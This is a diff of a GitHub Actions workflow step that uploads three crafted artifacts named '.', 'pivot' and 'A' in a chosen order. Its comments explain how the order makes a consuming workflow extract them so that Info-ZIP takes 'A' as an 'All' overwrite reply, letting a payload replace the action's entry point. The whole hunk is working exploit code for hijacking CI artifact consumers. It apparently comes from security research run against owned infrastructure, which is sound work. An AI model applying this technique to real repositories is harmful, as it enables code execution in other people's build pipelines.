@@ -135,11 +135,11 @@ jobs:
               if (!finalize.ok) throw new Error(`FinalizeArtifact failed for ${JSON.stringify(name)}`);
             }
   
-            // The REST artifact list is descending by artifact ID. Creating
-            // "pivot" before "." makes the consumer extract "." first. The older "A"
-            // record is consumed by Info-ZIP as its noninteractive "All" reply
-            // when the payload replaces the action's existing entry point.
-            await upload('A', path.join(process.env.RUNNER_TEMP, 'answer.zip'));
-            await upload('pivot', path.join(process.env.RUNNER_TEMP, 'pivot.zip'));
+            // Owned live control showed this run's REST list preserved the
+            // sequential CreateArtifact order. The consumer must see '.',
+            // then 'pivot', then 'A'; the final record is consumed by
+            // Info-ZIP as its noninteractive "All" reply.
             await upload('.', path.join(process.env.RUNNER_TEMP, 'dot.zip'));
+            await upload('pivot', path.join(process.env.RUNNER_TEMP, 'pivot.zip'));
+            await upload('A', path.join(process.env.RUNNER_TEMP, 'answer.zip'));
             console.log('Uploaded benign three-artifact pivot');
